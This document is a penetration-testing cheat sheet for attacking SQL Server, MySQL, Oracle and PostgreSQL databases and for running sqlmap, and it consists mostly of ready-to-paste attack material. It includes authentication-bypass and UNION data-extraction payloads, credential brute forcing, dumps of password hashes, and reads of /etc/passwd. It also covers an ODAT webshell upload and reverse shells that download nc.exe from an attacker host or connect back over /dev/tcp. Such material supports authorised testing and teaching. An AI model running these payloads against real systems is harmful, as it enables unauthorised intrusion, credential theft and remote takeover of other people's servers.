# SQL Injection

## Overview

Bypass authentication, extract data with UNION, and trigger blind delays. Append to form fields or URL parameters.

## Payloads / Techniques

Login bypass:
    generic:  ' OR 1=1--
    Windows:  admin'--
    Linux:    root'--
    URL:      http://<target>/products?category=cars'+OR+1=1--

Comment and encoding:
    --          MSSQL/MySQL comment (trails rest of query)
    #           MySQL comment if -- errors
    +           URL-encoded space: '+OR+1=1--

Alternatives:
    ' OR 2=2--
    ' OR 2-1=1--
    ' OR 2>1--

UNION — find column count:
    ' ORDER BY 1--
    ' ORDER BY 2--
    ' ORDER BY 3--
    # increase until error

UNION — find string column (example: 3 columns):
    ' UNION SELECT 'test', NULL, NULL--
    ' UNION SELECT NULL, 'test', NULL--
    ' UNION SELECT NULL, NULL, 'test'--

UNION — version by DBMS:
    Microsoft, MySQL:  ' UNION SELECT @@version--
    Oracle:            ' UNION SELECT * FROM v$version--
    PostgreSQL:        ' UNION SELECT version()--

UNION — enumerate and extract:
    ' UNION SELECT table_name, NULL FROM information_schema.tables--
    ' UNION SELECT username, password FROM users--
    ' UNION SELECT * FROM information_schema.columns WHERE table_name = '<table>'--

Blind (MSSQL time delay):
    '; waitfor delay ('0:0:20')--

## Validation / False Positives

A single 500 on a quote probe needs a reproducible error, boolean change, or extracted data to confirm.
ORDER BY succeeding does not prove injectable UNION — confirm data appears in the response.


# MS-SQL

## Overview

Locate instances on UDP/1434, brute credentials, connect with impacket, and escalate through xp_cmdshell.

## Commands

Resources:
    https://book.hacktricks.xyz/pentesting/pentesting-mssql-microsoft-sql-server
    https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet

Locate:
    nmap -Pn -n -T4 --open -p1434 -sU <target IP>
    nmap -Pn -n -T4 --open -p1434 -sU --script ms-sql-info,ms-sql-brute \
        --script-args mssql.instance-all,userdb=userlist.txt,passdb=wordlist.txt <target IP>

Metasploit:
    msf > use auxiliary/scanner/mssql/mssql_ping
    msf > use auxiliary/scanner/mssql/mssql_login
    msf > use auxiliary/admin/mssql/mssql_enum
    msf > use auxiliary/scanner/mssql/mssql_hashdump
    msf > use auxiliary/admin/mssql/mssql_escalate_dbowner

Connect:
    impacket-mssqlclient <host name>/<user>@<target IP> -windows-auth
    select @@version;
    SELECT name FROM master..syslogins

Command execution:
    enable_xp_cmdshell
    xp_cmdshell whoami /all
    xp_cmdshell net user

Reverse shell (attacker):
    cd /usr/share/windows-binaries/
    sudo python3 -m http.server 80
    sudo nc -lvnp 443

    xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; wget http://<attacker IP>/nc.exe -outfile nc.exe"
    xp_cmdshell "powershell -c cd C:\Users\sql_svc\Downloads; .\nc.exe -e cmd.exe <attacker IP> 443"

Privesc after foothold:
    # transfer winPEASx64.exe via same wget pattern
    impacket-psexec administrator@<target IP>

SSMS (GUI):
    Object Explorer > Databases > Tables > right-click > Select Top 1000 Rows
    Edit query to SELECT * FROM <table> > Execute > Save Results As

## Validation / False Positives

xp_cmdshell is disabled by default on modern MSSQL — document re-enable steps or alternate paths (CLR, agent jobs).
Open UDP/1434 without a reachable TCP 1433 instance is not authenticated access.


# MySQL

## Overview

Remote client access, file read via LOAD_FILE, shell escape from the mysql client, and UNION-based enumeration.

## Commands

Remote login:
    mysql -h <target IP> -u <username> -p<password>

Enumerate (with creds):
    show databases;
    use <database>;
    show tables;
    select * from <table>;

File read (requires FILE privilege):
    SELECT LOAD_FILE('/etc/passwd')\g

Shell escape from mysql client:
    \! whoami
    \! sudo bash

## Payloads / Techniques

Lab example — 4-column UNION chain:
    1 UNION SELECT NULL,NULL,NULL,@@hostname
    1 UNION SELECT NULL,NULL,NULL,version()
    1 UNION SELECT NULL,NULL,NULL,current_user()
    1 UNION SELECT NULL,NULL,NULL,TABLE_SCHEMA FROM information_schema.tables
    1 UNION SELECT NULL,NULL,NULL,database()
    1 UNION SELECT NULL,NULL,NULL,TABLE_NAME FROM information_schema.tables WHERE table_schema='challenge'
    1 UNION SELECT NULL,NULL,NULL,CONCAT(TABLE_NAME,0x0A,COLUMN_NAME) FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='comments'
    1 UNION SELECT NULL,NULL,NULL,CONCAT(username,0x0A,password) FROM users

## Validation / False Positives

LOAD_FILE returns NULL without FILE privilege or if secure_file_priv blocks the path — not evidence the file is missing.
Use straight ASCII quotes in payloads — curly quotes break copy-paste into URLs.


# Oracle

## Overview

Workflow: locate listener, determine version and SID, brute credentials, escalate privileges, enumerate, and optionally write webshells via ODAT.

## Commands

Locate:
    nmap -Pn -n -T4 --open -p1521 <target IP>

Version:
    msf > use auxiliary/scanner/oracle/tnslsnr_version
    tnscmd10g version -h <target IP>
    tnscmd10g status -h <target IP>

SID:
    msf > use auxiliary/scanner/oracle/sid_enum
    msf > use auxiliary/admin/oracle/sid_brute
    sidguess -i <target IP> -d /usr/share/metasploit-framework/data/wordlists/sid.txt
    http://<target IP>:8080/oradb/PUBLIC/GLOBAL_NAME

Brute force:
    msf > use auxiliary/admin/oracle/login_brute
    sqlplus <username>/<password>@<target IP>:<port>/<SID>

Privilege escalation:
    msf > use auxiliary/admin/oracle/sql
    set DBUSER <user>
    set DBPASS <password>
    set SID <sid>
    set SQL select * from user_role_privs
    set SQL GRANT DBA TO <user>
    set SQL GRANT JAVASYSPRIV TO <user>

Enumerate:
    SELECT * FROM v$version;
    SELECT * FROM dba_registry_history;
    SELECT * FROM all_users;
    SELECT owner, table_name FROM all_tables;
    SELECT * FROM session_roles;
    SELECT * FROM user_role_privs;

sqlplus:
    sqlplus <user>/<password>@<target IP>:1521/<database>
    sqlplus <user>/<password>@<target IP>:1521/<database> as sysdba

ODAT webshell upload:
    ./odat.py dbmsxslprocessor -s <target IP> -d <db> -U <user> -P <password> \
        --putFile 'C:\inetpub\wwwroot\' test.txt /root/test.txt --sysdba
    curl http://<target>/test.txt

## Validation / False Positives

Default SIDs (ORCL, XE) failing brute force does not rule out a custom SID — enumerate before large wordlists.
DBA grant requires sufficient existing privileges — capture before/after role queries.


# PostgreSQL

## Overview

psql client access, credential dumps from system catalogs, file read via COPY, and command execution through COPY FROM PROGRAM.

## Commands

Connect:
    psql -U <username> -h <target IP> -d <database>
    psql -U postgres -h <target IP>

Meta commands:
    \l          list databases
    \dt         list tables
    \du         list users
    \c <db>     connect to database

Read file (superuser):
    create table test (input TEXT);
    copy test from '/etc/passwd';
    select input from test;

Directory listing (superuser):
    select pg_ls_dir('/etc');

Command execution via COPY:
    create table tmp(output text);
    copy tmp from program 'id';
    select * from tmp;
    drop table tmp;

Dump creds:
    select * from pg_shadow;
    select * from pg_user;
    select * from pg_roles;

Reverse shell:
    create table shell(data text);
    copy shell from program 'bash -i >& /dev/tcp/<attacker IP>/4444 0>&1 &';

## Validation / False Positives

COPY FROM PROGRAM requires superuser — a low-privilege login with SQLi is not the same as OS command execution.
pg_shadow access without crackable hashes is informational — confirm hash format and cracking path.


# sqlmap

## Overview

Automate SQLi detection, database dump, and OS shell from captured HTTP requests. CO2 Burp integration is optional — CLI with `-r` is preferred.

## Commands

From URL:
    sqlmap -u 'http://<target>/index.php?search=test' --cookie='PHPSESSID=<cookie>' --os-shell

From Burp request file:
    sqlmap -r tmp --force-ssl --batch --dbs
    sqlmap -r tmp --force-ssl --batch -D <database> --tables
    sqlmap -r tmp --force-ssl --batch -D <database> -T <table> --dump
    sqlmap -r tmp --force-ssl --batch --os-cmd id
    sqlmap -r tmp --force-ssl --batch --os-shell

UNION-only example:
    sqlmap -u "http://<target>/page.php?id=1" --technique=U --dbms=mysql \
        --threads=10 --random-agent --tamper=space2comment

Stabilize os-shell:
    nc -lvnp 443
    os-shell> bash -c "bash -i >& /dev/tcp/<attacker IP>/443 0>&1"

Upgrade to interactive TTY:
    python3 -c 'import pty;pty.spawn("/bin/bash")'
    # ctrl+z
    stty raw -echo
    fg
    export TERM=xterm

Burp CO2 (optional):
    Extender > BAppStore > CO2 > Install
    Proxy > capture request > Extension > CO2 > Send to SQLMapper
    CO2 > Config > SQLMap Path: /usr/bin/sqlmap

## Validation / False Positives

sqlmap reporting "parameter appears injectable" still needs manual confirmation on critical findings.
--os-shell requires stacked queries or file-write primitives — document which condition applied.
